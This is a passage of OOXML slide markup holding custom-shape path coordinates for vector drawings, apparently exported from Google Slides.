                  <a:lnTo>
                    <a:pt x="8400" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9170" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9170" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="5429"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3852" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3522" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2604" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="1357"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="73"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="0"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8730" y="3962"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8584" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="9170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="9170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="3962"/>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8" name="Google Shape;318;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6385050" y="4208725"/>
              <a:ext cx="422775" cy="298975"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="16911" h="11959" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="12215" y="8951"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12032" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11481" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="8951"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12619" y="8988"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12839" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11481" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12288" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="8988"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9464" y="514"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9721" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10564" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10564" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10784" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10674" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11591" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10674" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11261" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13205" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14012" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13682" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12068" y="3669"/>
